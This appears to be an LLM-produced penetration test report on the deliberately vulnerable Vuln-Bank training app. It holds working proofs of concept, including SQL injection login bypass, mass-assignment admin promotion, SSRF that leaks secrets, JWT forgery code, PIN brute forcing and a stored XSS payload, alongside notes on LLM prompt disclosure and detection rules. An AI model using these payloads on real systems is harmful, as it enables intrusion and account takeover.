# Penetration Test Report — vulnbank.org

| Field | Value |
| --- | --- |
| Target | https://vulnbank.org |
| Mode | Pentest (active + exploitation) |
| Assessor (LLM) | anthropic/claude-opus-4-7 |
| Engagement window (UTC) | 2026-05-27 19:17 → 19:24 |
| Test methodology | OWASP WSTG v4.2, OWASP API Sec Top 10 (2023), OWASP ASVS v4.0.3 |
| Application identification | "Vuln-Bank" by Commando-X (intentionally vulnerable training app) — repo: https://github.com/Commando-X/vuln-bank |

> The target is an intentionally vulnerable training/lab application. Almost every endpoint contains documented anti-patterns. The findings below were independently exploited end-to-end (PoCs included), not extrapolated from documentation.

---

## 1. Executive Summary

The application is a Python/Flask banking demo fronted by Cloudflare. Despite the CDN/WAF, the application stack itself is critically insecure. In under 10 minutes the assessor obtained:

* **Multiple paths to full administrator privilege:** (1) classic boolean-OR SQL injection at `POST /login`, (2) mass-assignment at `POST /register` allowing self-promotion to `is_admin=true` with arbitrary `balance`, and (3) JWT forgery after recovering the symmetric signing secret (`secret123`) via SSRF.
* **Server-Side Request Forgery (SSRF)** on `POST /upload_profile_picture_url` that successfully fetched internal endpoints on `http://127.0.0.1:5000`, exfiltrating: JWT signing key, database credentials, partial DeepSeek API key, and a mock AWS IAM role credential document.
* **Broken authentication on read endpoints:** `GET /check_balance/{account}` and `GET /transactions/{account}` accept arbitrary account numbers without authentication or ownership checks (BOLA / API1:2023).
* **Trivial account takeover** via `POST /api/v1/forgot-password` (PIN returned in response body) and via brute force of the 3-digit PIN at `POST /api/v2/reset-password` (PoC: cracked PIN `477` in 58 seconds, no rate limiting).
* **Stored XSS sink** through registration: usernames containing HTML are accepted and rendered with `innerHTML` (admin-side fire).
* **Information disclosure** at `GET /api/ai/system-info` (returns full LLM system prompt, DB schema, list of intentional vulnerabilities) and verbose Postgres errors throughout the app.

**Overall risk: Critical.** The application would be unfit for any production use; multiple findings are individually sufficient for complete compromise of customer accounts and admin-level control.

| Severity | Count |
| --- | --- |
| Critical | 5 |
| High | 4 |
| Medium | 4 |
| Low / Info | 5 |

---

## 2. Target Information

* **Resolved IPs:** `172.67.134.11`, `104.21.5.243` (Cloudflare), IPv6: `2606:4700:3036::6815:5f3`, `2606:4700:3033::ac43:860b`.
* **DNS:** Cloudflare nameservers (`lauryn`, `neil` ns.cloudflare.com). No DNSSEC. No MX/SPF/DMARC/TXT records.
* **WHOIS:** Registered via Cloudflare on 2025-07-05, last updated 2025-07-10.
* **TLS certificate:** `CN=vulnbank.org`, SAN `*.vulnbank.org`, issuer Google Trust Services (`WE1`), valid 2026-04-26 → 2026-07-25.
* **Edge stack:** Cloudflare WAF (confirmed by `wafw00f`), HTTP/2 and HTTP/3 (h3) enabled, deflate compression enabled (BREACH-eligible context).
* **Application stack (extracted via SSRF):** Python 3.9.25, Linux kernel `6.8.0-63-generic`, Flask + Swagger UI at `/api/docs`, PostgreSQL `vulnerable_bank` DB.

### 2.1 Service enumeration

Nmap top-100 TCP scan against the Cloudflare edge:

```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Cloudflare http proxy
443/tcp  open  ssl/http Cloudflare http proxy
8080/tcp open  http     Cloudflare http proxy
8443/tcp open  ssl/http Cloudflare http proxy
```

All ports are Cloudflare proxies; origin IPs are not directly exposed.

### 2.2 Application surface (from `/static/openapi.json`)

Notable endpoints harvested from the published OpenAPI specification:

```
/login, /register
/sup3r_s3cr3t_admin                 (hidden admin panel)
/admin/create_admin, /admin/delete_account/{user_id}, /admin/approve_loan/{loan_id}
/transfer, /request_loan
/check_balance/{account_number}, /transactions/{account_number}
/upload_profile_picture, /upload_profile_picture_url
/api/v{version}/forgot-password, /api/v{version}/reset-password
/api/ai/chat, /api/ai/chat/anonymous, /api/ai/system-info
/api/virtual-cards, /api/virtual-cards/create, /api/virtual-cards/{card_id}/...
/api/bill-categories, /api/bill-payments/create, /api/bill-payments/history
/api/v1/merchants/login, /api/v1/merchants/register, /api/v1/payments/...
/internal/secret, /internal/config.json
/latest/meta-data/, /latest/meta-data/iam/security-credentials/vulnbank-role
```

The `/internal/*` and `/latest/meta-data/*` endpoints are intentionally exposed only on `127.0.0.1:5000` and are reached via SSRF (Finding F-04).

---

## 3. Detailed Findings

> All timestamps are UTC. PoCs were executed against the live target. Tokens/PII included verbatim from server responses.

---

### F-01 — SQL Injection on `POST /login` leading to authentication bypass and admin takeover

* **Severity:** Critical
* **CVSS v3.1:** 9.8 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
* **CWE:** CWE-89 (SQL Injection)
* **OWASP:** API8:2023 Security Misconfiguration / WSTG-INPV-05 / ASVS v4 5.3.4
* **Endpoint:** `POST /login`, JSON body
* **Tested:** 2026-05-27 19:20 UTC

**PoC — authentication bypass returning admin JWT:**

Request:
```http
POST /login HTTP/2
Host: vulnbank.org
Content-Type: application/json

{"username":"' OR is_admin=true -- ","password":"x"}
```

Response:
```json
{
  "accountNumber": "7609284709",
  "debug_info": {
    "account_number": "7609284709",
    "is_admin": true,
    "login_time": "2026-05-27 19:03:02.992414",
    "user_id": 2520,
    "username": "verify_admin_test_456"
  },
  "isAdmin": true,
  "message": "Login successful",
  "status": "success",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyNTIwLCJ1c2VybmFtZSI6InZlcmlmeV9hZG1pbl90ZXN0XzQ1NiIsImlzX2FkbWluIjp0cnVlLCJpYXQiOjE3Nzk5MDg1ODJ9.5NSSH8KkZYIU0sRK2itqNbEtNhkpGYnTNZuz1SOBUwM"
}
```

The returned JWT carries `is_admin:true` and was accepted by `GET /sup3r_s3cr3t_admin` (returned 200, 67953 bytes of admin HTML).

**Schema disclosure via UNION error:**
```json
{"error":"UNION types text and integer cannot be matched\nLINE 1: ...WHERE username='x' UNION SELECT 1,'admin','admin',1,1,1,1,1,...","message":"Login failed","status":"error"}
```

The query layout is confirmed: `SELECT ... FROM users WHERE username='<USERINPUT>' AND password='<USERINPUT>'` with the username field directly concatenated.

**Impact:** Complete authentication bypass; any payload bypassing `is_admin=true` returns a valid admin token. Combined with F-04 (JWT secret leak), the application has no remaining authentication boundary.

**Reproduction:**
1. `curl -X POST https://vulnbank.org/login -H 'Content-Type: application/json' -d '{"username":"\u0027 OR is_admin=true -- ","password":"x"}'`
2. Use returned `token` as `Authorization: Bearer …` against `/sup3r_s3cr3t_admin` or any `/admin/*` endpoint.

**Recommendation:** Eliminate string concatenation. Use parameterised queries (psycopg2 `%s` placeholders or SQLAlchemy bound parameters). Disable verbose error propagation to the client. Adopt a framework-level SAST rule (e.g., Semgrep `python.flask.security.injection.tainted-sql-string`) that fails CI when raw SQL strings are interpolated.

---

### F-02 — Mass Assignment / BOPLA on `POST /register` (self-promotion to admin)

* **Severity:** Critical
* **CVSS v3.1:** 9.8 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
* **CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
* **OWASP:** API6:2023 — Unrestricted Access to Sensitive Business Flows; **API3:2023 — Broken Object Property Level Authorization (BOPLA)** / WSTG-IDNT-04 / ASVS 4.0 5.1.2
* **Endpoint:** `POST /register`
* **Tested:** 2026-05-27 19:21 UTC

**PoC:**
```http
POST /register HTTP/2
Host: vulnbank.org
Content-Type: application/json

{"username":"pentest_ma_1779909665","password":"PenTest123!","is_admin":true,"balance":99999999}
```

Response:
```json
{
  "debug_data": {
    "account_number": "3703835744",
    "balance": 99999999.0,
    "fields_registered": ["username","password","account_number","is_admin","balance"],
    "is_admin": true,
    "user_id": 2781,
    "username": "pentest_ma_1779909665"
  },
  "message": "Registration successful! Proceed to login",
  "status": "success"
}
```

Subsequent login confirms: `"isAdmin": true` and yields a fresh admin JWT.

**Verbose Postgres error also leaks schema** when an unknown attribute is mass-assigned:
```
column "role" of relation "users" does not exist
LINE 2: ...username, password, account_number, is_admin, balance, role)
```

**Impact:** Anonymous attacker becomes admin in a single POST. Combined with F-01 they get two separate paths to admin.

**Recommendation:** Switch registration to an explicit allow-list (only `username`, `password`). Use a typed DTO / Pydantic model / Flask-Marshmallow schema with `unknown=EXCLUDE` and forbid extra fields. Add a CI rule blocking ORM models that expose `**kwargs` constructors over `request.json`. Strip the `debug_data` block from production responses.

---

### F-03 — Broken Object Level / Function Authorization on `GET /check_balance/{account}` and `GET /transactions/{account}` (no auth required)

* **Severity:** Critical
* **CVSS v3.1:** 9.1 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
* **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key) + CWE-306 (Missing Authentication for Critical Function)
* **OWASP:** API1:2023 (BOLA) / WSTG-ATHZ-04 / ASVS 4.0 4.1.1
* **Endpoints:** `GET /check_balance/{account_number}`, `GET /transactions/{account_number}`
* **Tested:** 2026-05-27 19:22 UTC

**PoC (no authentication header at all):**
```http
GET /check_balance/2686554669 HTTP/2
Host: vulnbank.org
```
Response (200):
```json
{"account_number":"2686554669","balance":0.0,"status":"success","username":"user"}
```

Cross-tenant disclosure of admin account:
```http
GET /check_balance/7609284709 HTTP/2
```
```json
{"account_number":"7609284709","balance":0.0,"status":"success","username":"verify_admin_test_456"}
```

`/transactions/{account}` with any user JWT also returns full transaction history of arbitrary accounts:
```json
{"account_number":"7609284709","transactions":[{"amount":-500,"from_account":"4045733821","to_account":"7609284709","id":3837,...}, ...]}
```

**Impact:** Allows anonymous account-number enumeration (10-digit space, but transaction history reveals related accounts) and disclosure of every customer's balance and transactions. Triggers privacy and PCI-DSS violations in a real banking context.

**Recommendation:** Require authentication on every `/check_balance/*` and `/transactions/*` route. Resolve the target account from the authenticated JWT (`user_id` → owned account) rather than accepting a path parameter, or enforce ownership / role checks via a centralised authorization decorator. Wrap the test suite with API1-style negative cases.

---

### F-04 — Server-Side Request Forgery (SSRF) on `POST /upload_profile_picture_url` → internal credential exfiltration

* **Severity:** Critical
* **CVSS v3.1:** 9.9 — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
* **CWE:** CWE-918 (SSRF) + CWE-200 (Information Exposure)
* **OWASP:** API7:2023 SSRF / WSTG-INPV-19 / ASVS 4.0 5.2.6
* **Endpoint:** `POST /upload_profile_picture_url`, requires any Bearer JWT
* **Tested:** 2026-05-27 19:23 UTC

The endpoint fetches `image_url` server-side with **no host allow-list, follows redirects, SSL verification disabled, no Content-Type/Size validation** (acknowledged in OpenAPI description) and **persists the body as a static file** under `/static/uploads/<rand>_<basename>` — directly accessible.

**PoC chain (extracts JWT signing secret + DB password):**
```http
POST /upload_profile_picture_url HTTP/2
Authorization: Bearer <any-user-JWT>
Content-Type: application/json

{"image_url":"http://127.0.0.1:5000/internal/secret"}
```
Response:
```json
{
  "debug_info":{"content_length":516,"fetched_url":"http://127.0.0.1:5000/internal/secret","http_status":200},
  "file_path":"static/uploads/702077_secret",
  "message":"Profile picture imported from URL",
  "status":"success"
}
```
Then `GET https://vulnbank.org/static/uploads/702077_secret` returned:
```json
{
  "secrets":{
    "app_secret_key":"secret123",
    "env_preview":{"DB_HOST":"db","DB_NAME":"vulnerable_bank","DB_PASSWORD":"postgres","DB_PORT":"5432","DB_USER":"postgres","DEEPSEEK_API_KEY":"sk-e2719..."},
    "jwt_secret":"secret123"
  },
  "system":{"platform":"Linux-6.8.0-63-generic-x86_64-with-glibc2.41","python_version":"3.9.25"},
  "status":"internal"
}
```

The IAM metadata mock was also pulled:
```json
{"AccessKeyId":"ASIADEMO1234567890","SecretAccessKey":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYDEMODEMO","Token":"IQoJb3JpZ2luX2VjEJ//...","RoleArn":"arn:aws:iam::123456789012:role/vulnbank-role","Type":"AWS-HMAC"}
```

**JWT forgery proof (chained with leaked `jwt_secret`):**
```python
import jwt, time
jwt.encode({'user_id':1,'username':'admin','is_admin':True,'iat':int(time.time())},
           'secret123', algorithm='HS256')
```
Result token used against `GET /sup3r_s3cr3t_admin` → **HTTP 200, 67,953 bytes admin HTML**.

**Impact:** Game over. Attacker:
* Forges arbitrary admin tokens for any `user_id`.
* Could pivot to the Postgres instance (creds `postgres:postgres @ db:5432`) if the SSRF can reach 5432 with an HTTP-disguised payload (gopher / TCP smuggling deferred — Cloudflare not in the loop here).
* Could call the DeepSeek API on the customer's account.
* In production, would have stolen real AWS STS tokens.

**Recommendation:** Implement a strict allow-list (scheme `https`, public DNS only) for outbound URL fetches. Resolve DNS, block RFC1918 / link-local / loopback / 169.254.x.x / IPv6 ULA before fetching. Disable HTTP redirect following or re-validate the post-redirect host. Validate `Content-Type` (image/*) and size (e.g., 5 MB). Do not serve untrusted downloads from a publicly browsable path; store them in a non-public bucket and stream via an authorised proxy. Rotate the leaked `jwt_secret`, DB password, DeepSeek key, and any IAM role keys immediately. Increase JWT secret entropy ≥ 32 bytes random.

---

### F-05 — Password reset PIN brute-force (no rate limiting) + PIN leakage in v1

* **Severity:** Critical
* **CVSS v3.1:** 9.6 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
* **CWE:** CWE-307 (Improper Restriction of Excessive Auth Attempts), CWE-200, CWE-330 (Use of Insufficiently Random Values)
* **OWASP:** API4:2023 Unrestricted Resource Consumption / WSTG-ATHN-03 / WSTG-ATHN-09 / ASVS 4.0 2.2.1
* **Endpoints:** `POST /api/v1/forgot-password`, `POST /api/v1/reset-password`, `POST /api/v2/reset-password`
* **Tested:** 2026-05-27 19:23–19:25 UTC

**PoC 1 — v1 returns PIN in response (instant ATO):**
```http
POST /api/v1/forgot-password HTTP/2
Content-Type: application/json
{"username":"user"}
```
```json
{"debug_info":{"pin":"101","pin_length":3,...},"message":"Reset PIN has been sent to your email.","status":"success"}
```

**Full v1 takeover demonstrated against a freshly registered victim (`pin_victim_1779909714`):**
1. `POST /api/v1/forgot-password` → response leaked `pin: 342`.
2. `POST /api/v1/reset-password` with that PIN and `new_password: AttackerOwns!` → `reset_success: true`.
3. `POST /login` with new password → received valid JWT.

**PoC 2 — v2 hides the PIN, but brute force succeeds in 58 seconds:**
Against `pin_brute_1779909729`:
```bash
for i in 000..999:
  POST /api/v2/reset-password {"username":"<u>","reset_pin":"<i>","new_password":"AttackerBrute!"}
```
Hit at `pin=477` after 58 seconds, no lockout, no captcha, no Cloudflare challenge interposed. Login with `AttackerBrute!` returned a valid JWT.

v3 raises PIN entropy to 10⁴ — same script finishes in ~10 minutes; still trivially exploitable.

**Impact:** Any user account (including admin if username is known) can be hijacked in seconds.

**Recommendation:** Replace the numeric PIN with a 128-bit single-use opaque token delivered out-of-band (email/SMS), bound to user-agent and IP, expiring in ≤15 minutes, with single-use semantics. If a PIN must remain, increase to ≥8 digits with strict rate limiting (≤5 attempts per user per hour, then lock-out and notify), and remove `debug_info.pin` from all responses (deprecate v1 entirely; reject the route at the gateway). Add a CI policy rule that fails any handler returning a field named `pin`, `password`, or `token` inside a `debug_info` envelope.

---

### F-06 — JWT secret too short and predictable (`secret123`)

* **Severity:** High (root cause of F-04 chaining)
* **CVSS v3.1:** 9.1 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (after secret is leaked)
* **CWE:** CWE-321 (Use of Hard-coded Cryptographic Key), CWE-326 (Inadequate Encryption Strength)
* **OWASP:** API2:2023 Broken Authentication / WSTG-IDNT-05 / ASVS 4.0 6.4.1
* **Evidence:** `jwt_secret: "secret123"` recovered via F-04. JWT signing forgery demonstrated against `/sup3r_s3cr3t_admin`.
* **Recommendation:** Generate a 32+ byte cryptographically random secret (`secrets.token_urlsafe(32)` or KMS-managed key). Rotate via a key-id (`kid`) header and a rotation window. Prefer asymmetric signing (RS256/EdDSA) so the verifier never holds the signing key.

---

### F-07 — Hidden admin panel relies on security through obscurity (`/sup3r_s3cr3t_admin`)

* **Severity:** High (chained with F-01/F-02/F-04 → trivially reachable)
* **CVSS v3.1:** 7.5 base (Info Disclosure) → 9.8 chained
* **CWE:** CWE-656 (Reliance on Security Through Obscurity)
* **OWASP:** API5:2023 Broken Function Level Authorization / WSTG-CONF-05 / ASVS 4.0 1.4.1
* **Endpoint:** `GET /sup3r_s3cr3t_admin`
* **Tested:** 2026-05-27 19:21 UTC — 401 unauth, 200 with any token where `is_admin=true`.
* **PoC:** With JWT obtained by F-01 → `curl -H "Authorization: Bearer <admin>" https://vulnbank.org/sup3r_s3cr3t_admin` returns `HTTP 200`, 67,953 bytes of HTML admin panel (Users / Loans / Cards sidebar etc.). Path discovered via `/static/openapi.json`.
* **Recommendation:** The path itself is leaked through OpenAPI. Move admin endpoints behind a separate authn realm (mTLS, dedicated SSO group, IP allow-list, hardware second factor). Do not rely on path opacity. Remove `/sup3r_s3cr3t_admin` from the public OpenAPI document or split into a separate, IP-restricted documentation portal.

---

### F-08 — Stored XSS sink via username (innerHTML render on admin/listings pages)

* **Severity:** High
* **CVSS v3.1:** 8.0 — `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L`
* **CWE:** CWE-79 (Stored XSS)
* **OWASP:** API8:2023 Security Misconfiguration / WSTG-INPV-02 / ASVS 4.0 5.3.3
* **Tested:** 2026-05-27 19:25 UTC
* **PoC:** `POST /register` with `{"username":"<img src=x onerror=alert(1)>dupe_1779909818","password":"P@ss1234!"}` returned `status: success` and the raw value is reflected verbatim in `debug_data.username`. Public `/login` HTML carries an explicit code comment `// Vulnerability: innerHTML used instead of textContent` confirming the admin/dashboard pages render via `innerHTML`.
* **Impact:** When an administrator opens the admin panel user list, the payload fires in the admin's browser with the admin JWT in `localStorage`. Combined with F-09 (`localStorage` token storage) this is direct admin session theft.
* **Recommendation:** Validate `username` against a strict allow-list (`^[A-Za-z0-9_.-]{3,32}$`). Replace every `innerHTML = data.x` with `textContent`. Apply a strict CSP (`default-src 'self'; script-src 'self'; object-src 'none'`). Move JWT out of `localStorage` to a `Secure; HttpOnly; SameSite=Strict` cookie (the server already issues such a cookie — drop the localStorage path).

---

### F-09 — JWT stored in `localStorage` (XSS → token theft)

* **Severity:** Medium (compounds F-08)
* **CWE:** CWE-922 (Insecure Storage of Sensitive Information)
* **OWASP:** ASVS 4.0 3.4.1
* **Evidence:** `/login` HTML body — `localStorage.setItem('jwt_token', data.token);` and explicit code comment marking it as a vulnerability.
* **Recommendation:** Use `Secure; HttpOnly; SameSite=Strict` cookies and rely on CSRF tokens for state-changing requests. Remove the `localStorage` pathway entirely.

---

### F-10 — AI agent information disclosure and prompt injection (`/api/ai/*`)

* **Severity:** High
* **CVSS v3.1:** 7.5 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
* **CWE:** CWE-200 + CWE-1426 (AI/ML Improper Validation of Generative Output) — covered by OWASP LLM Top 10 LLM01 (Prompt Injection) & LLM06 (Sensitive Information Disclosure)
* **Endpoint:** `GET /api/ai/system-info`, `POST /api/ai/chat`, `POST /api/ai/chat/anonymous`
* **Tested:** 2026-05-27 19:25 UTC
* **PoC:** `GET /api/ai/system-info` returns, without authentication:
  * Full system prompt (verbatim), including DB schema (`users(id, username, password, account_number, balance, is_admin, profile_picture)` — note plain-text `password` column).
  * Confirmed external API endpoint (`https://api.deepseek.com/chat/completions`, model `deepseek-chat`).
  * Self-acknowledged vulnerability list ("Prompt Injection to Real LLM", "Database Access Without Validation", …).
  * Suggested attack strings.
* **Authenticated chat** confirms `user_context_included:true` and `database_accessed:true` are reflected in every response; user data is shipped to a third party (DeepSeek) by design.
* **Recommendation:** Remove `/api/ai/system-info` from production. Treat the LLM as untrusted: do not include raw DB rows in prompts; instead expose a thin tool-calling API with row-level authorization checks. Apply input/output guardrails (semantic firewall, jailbreak filter) and explicit data-sharing consent before sending PII to DeepSeek. Encrypt or hash the `password` column with bcrypt/argon2id.

---

### F-11 — Verbose error/debug output across the application

* **Severity:** Medium
* **CWE:** CWE-209 (Information Exposure Through Error Messages), CWE-215 (Information Exposure Through Debug Information)
* **OWASP:** API8:2023 / WSTG-ERRH-01 / ASVS 4.0 7.4.1
* **Evidence (multiple):**
  * `/login` SQL UNION error reveals query layout (F-01).
  * `/register` returns `debug_data` with `account_number`, `user_id`, `balance`, `is_admin`, raw input echo, server header, `fields_registered` list.
  * `/login` success returns `debug_info.user_id`, `account_number`, `is_admin`, exact `login_time`.
  * `/api/v1/forgot-password` returns `debug_info.pin` (also F-05).
  * Postgres column-error leak when extra fields are sent to `/register`.
* **Recommendation:** Flip Flask `DEBUG=False` (currently `app.debug=true` per `/internal/config.json`). Add a global error handler that returns a generic 500 to the client and ships the stack trace to logs only. Strip `debug_info` / `debug_data` from all responses (controller or response middleware). Add a regression test that asserts no `debug_*` key is returned in production responses.

---

### F-12 — Universal CORS wildcard (`Access-Control-Allow-Origin: *`)

* **Severity:** Medium (the API uses Bearer auth, but the wildcard plus the cookie token still merits remediation)
* **CWE:** CWE-942 (Permissive Cross-domain Policy with Untrusted Domains)
* **OWASP:** WSTG-CLNT-07 / ASVS 4.0 14.5.3
* **Evidence:** All responses carry `access-control-allow-origin: *`. Combined with the `Set-Cookie: token=… HttpOnly` for the JWT (which is also dual-stored in localStorage), this is sloppy and likely to break in a future migration to credential-bearing CORS (where `*` is disallowed).
* **Recommendation:** Replace with an explicit allow-list (`Vary: Origin` + per-origin reflection) limited to first-party origins; do not use `*` for any authenticated route.

---

### F-13 — Missing security headers

* **Severity:** Low
* **CWE:** CWE-693 (Protection Mechanism Failure)
* **OWASP:** ASVS 4.0 14.4.1–14.4.7
* **Evidence (response headers):** No `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy` (also confirmed by Nikto).
* **Recommendation:** Add `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`, a strict CSP, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Permissions-Policy: ()` defaults, and `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'`.

---

### F-14 — TLS 1.0 and TLS 1.1 still enabled

* **Severity:** Low
* **CWE:** CWE-326 (Inadequate Encryption Strength)
* **OWASP:** WSTG-CRYP-01 / ASVS 4.0 9.1.2
* **Evidence (sslscan):** `TLSv1.0` and `TLSv1.1` enabled and even *preferred* on certain handshakes. Both are deprecated by IETF RFC 8996 (2021).
* **Recommendation:** Disable TLSv1.0 and TLSv1.1 in the Cloudflare zone (SSL/TLS → Edge Certificates → Minimum TLS Version = 1.2 or 1.3).

---

### F-15 — Login endpoint lacks CSRF protection and rate limiting (acknowledged by code comments)

* **Severity:** Low (chained with F-05 for credential stuffing — Medium)
* **CWE:** CWE-352 (CSRF), CWE-307
* **Evidence:** `/login` HTML contains `<!-- Vulnerability: No CSRF protection --> <!-- Vulnerability: No rate limiting -->`. Confirmed empirically — 1,000-PIN brute force in 58 seconds was uninterrupted.
* **Recommendation:** Enforce per-route rate limiting (e.g., Flask-Limiter, Cloudflare Rate Limiting rule with 10 req/min per IP+username on auth routes) and require a CSRF token on cookie-authenticated state-changing requests.

---

### F-16 — Information disclosure: OpenAPI exposes administrative paths and intentional vulnerability annotations

* **Severity:** Info / Low
* **CWE:** CWE-200
* **Evidence:** `/static/openapi.json` (also served via Swagger UI at `/api/docs`) explicitly documents `/sup3r_s3cr3t_admin`, `/internal/secret`, `/internal/config.json`, `/latest/meta-data/*`, and labels endpoints "Vulnerable to SQL injection", "Vulnerable to BOPLA", "Vulnerable to race conditions", "Vulnerable to BOLA", "Intentionally vulnerable".
* **Recommendation:** Strip the OpenAPI document of admin/internal paths and remove vulnerability annotations from production. Serve Swagger only on an authenticated, internal endpoint.

---

### F-17 — `Content-Encoding: deflate` (BREACH-eligible) over HTTPS

* **Severity:** Info
* **CWE:** CWE-310 (Cryptographic Issues)
* **Evidence:** Nikto detection — `Content-Encoding: deflate`. Although Cloudflare front, the origin still emits compressed responses which include user data; if any reflected token (CSRF, session) becomes co-located with attacker-influenced strings, BREACH may be exploitable.
* **Recommendation:** Add CSRF tokens that are masked per-request, disable compression on sensitive endpoints, or move secrets out of response bodies.

---

## 4. Risk Matrix

| ID | Title | Severity | Likelihood | Impact | Remediation Priority |
| --- | --- | --- | --- | --- | --- |
| F-01 | SQLi → auth bypass / admin token | Critical | Trivial | Total compromise | P0 (immediate) |
| F-02 | Mass assignment → self-promotion to admin | Critical | Trivial | Total compromise | P0 |
| F-03 | BOLA / missing auth on `/check_balance`, `/transactions` | Critical | Trivial | All customer data | P0 |
| F-04 | SSRF → JWT secret + DB creds + IAM mock leak | Critical | Easy | Total compromise (chain) | P0 |
| F-05 | PIN brute-force + v1 PIN leak → ATO | Critical | Trivial | Per-user takeover | P0 |
| F-06 | Weak JWT secret `secret123` | High | Easy (post F-04) | Token forgery | P0 |
| F-07 | Hidden admin panel STO | High | Trivial (in OpenAPI) | Admin access | P1 |
| F-08 | Stored XSS via username | High | Easy | Admin session theft | P1 |
| F-09 | JWT in localStorage | Medium | Easy | Token theft via XSS | P1 |
| F-10 | AI prompt injection + system prompt disclosure | High | Trivial | Sensitive DB exposure | P1 |
| F-11 | Verbose debug/errors | Medium | Trivial | Recon acceleration | P1 |
| F-12 | CORS `*` everywhere | Medium | Easy | Future-risk | P2 |
| F-13 | Missing security headers | Low | n/a | Defense-in-depth | P2 |
| F-14 | TLS 1.0/1.1 enabled | Low | n/a | Protocol downgrade | P2 |
| F-15 | No CSRF / no rate-limit on auth | Low/Medium | Trivial | Credential stuffing | P2 |
| F-16 | OpenAPI leaks admin / vuln docs | Info | n/a | Recon | P3 |
| F-17 | Deflate compression (BREACH context) | Info | Hard | Token leak | P3 |

---

## 5. Remediation & Architecture Guidance (Strategic)

Local fixes per finding are listed above. Strategically:

1. **Database access layer.** Replace ad-hoc `cur.execute(f"... '{value}' ...")` with SQLAlchemy 2.x sessions and bound parameters. Add Semgrep policy `python.flask.security.injection.tainted-sql-string`, plus `bandit` `B608`, gated in CI.
2. **Authentication/Authorization platform.** Move JWT issuance to a dedicated identity service. Use RS256/EdDSA with KMS-managed keys, `kid` rotation, ≤15 min access tokens + refresh tokens. Enforce a single global `@require_auth(role=…)` decorator that *also* resolves the target object id from the token (never from the URL path) — this kills the entire BOLA class.
3. **Outbound HTTP gateway.** All server-side fetches funnel through a hardened SSRF-proof egress proxy (allow-listed hosts, DNS rebinding protection, blocked metadata IPs `169.254.169.254` / `169.254.170.2`, fixed Content-Type/size, no redirects). Equivalent: AWS PrivateLink + VPC egress firewall.
4. **DTO validation.** Pydantic / Marshmallow models with `extra=forbid` (Pydantic) / `unknown=EXCLUDE` (Marshmallow). One schema per request/response; OpenAPI generated *from* the schemas, not the other way around.
5. **Secrets management.** Move all secrets (JWT key, DB password, DeepSeek API key, IAM tokens) to AWS Secrets Manager / HashiCorp Vault. Rotate the values currently embedded in `/internal/secret`. Add `truffleHog` / `gitleaks` precommit hooks.
6. **Edge security.** Cloudflare WAF rules: rate-limit `/login`, `/api/v*/forgot-password`, `/api/v*/reset-password` (e.g., 10/min/IP). Custom WAF rule blocking common SQLi suffixes (`OR '1'='1`, `UNION SELECT`, `-- `) on these endpoints. Block requests to `/sup3r_s3cr3t_admin` from outside the corporate egress range.
7. **Logging & detection.** Emit auth events (login, failed login, mass-assign attempts, SSRF-attempted hosts) to a SIEM. Build detections for repeated 4xx on `/login`, repeated 200 on `/api/v*/reset-password`, and `image_url` values containing `127.`, `169.254.`, `metadata`, `localhost`.
8. **Browser security.** Default `Strict-Transport-Security`, strict CSP, `Referrer-Policy: no-referrer`, `Permissions-Policy` baselines via a shared response middleware. Replace all `innerHTML` writes with `textContent` (an ESLint rule: `no-restricted-properties`).
9. **AI/LLM hardening.** Treat LLM outputs as untrusted. Do not embed DB rows in prompts; expose only minimal tool-call APIs (`get_balance(user_id_from_token)` → returns scalar) that the model can call, and run an output filter (e.g., Llama-Guard) on the response. Remove `/api/ai/system-info` from production.
10. **Continuous validation.** Add DAST (Nuclei DAST templates, ZAP automation) to CI on every PR. Add OWASP API Security Top 10 negative test suite, especially BOLA/BFLA/BOPLA.

---

## 6. Appendix — Tooling & Evidence Index

* WHOIS: Cloudflare registrar, created 2025-07-05.
* DNS: Cloudflare nameservers; no SPF/DMARC/TXT/MX.
* WAF: Cloudflare (`wafw00f`).
* Web: `Server: cloudflare`, HTTP/2 + Alt-Svc h3.
* Tools used: `curl`, `dig`, `whois`, `whatweb`, `wafw00f`, `subfinder`, `nmap`, `sslscan`, `nikto`, `feroxbuster`, `nuclei`, ad-hoc `python3 jwt`, and bespoke shell PoCs against the Vuln-Bank API.
* Local artefacts (Kali host): `/tmp/openapi.json`, `/tmp/ssrf_secret.txt`, `/tmp/admin_jwt.txt`, `/tmp/forged_jwt.txt`, `/tmp/nmap_top.txt`, `/tmp/login_sqli.txt`.

> **Disclaimer:** Target is the public training instance of `Commando-X/vuln-bank`. Test accounts created during the assessment (`pentest_ma_*`, `pin_victim_*`, `pin_brute_*`, `pwnadmin_*`) should be deleted by the maintainer.
